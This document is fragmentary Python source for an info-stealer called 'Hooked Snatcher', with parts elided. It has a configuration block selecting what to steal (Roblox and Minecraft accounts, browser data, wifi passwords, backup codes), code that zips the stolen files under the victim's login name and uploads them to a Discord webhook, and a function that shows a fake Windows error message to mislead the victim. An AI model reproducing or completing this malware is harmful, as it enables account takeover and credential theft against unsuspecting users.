...
#THIS IS WHERE YOU EDIT SETTINGS
#True = ENABLED
#False = DISABLED
__CONFIG__ = 
{
...
def main(webhook: str):
    ...
    data = {
        "username": "Hooked Snatcher",
        "avatar_url": "https://cdn.discordapp.com/attachments/710225557937455224/1115672602757824683/hookedgrabber.png"
    }

    _file = f'{localappdata}\\Hooked-{os.getlogin()}.zip'
    ...
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Hooked-{os.getlogin()}.zip', file, 'application/zip')})
...
def fakeerror():
    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules. Please try to run this at a later date.', 'Fatal Error', 0)
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Hooked-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Hooked Snatcher || Created by Hooked"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/710225557937455224/1115672602757824683/hookedgrabber.png"
                    }
                }
            ],
            "username": "Hooked Snatcher",
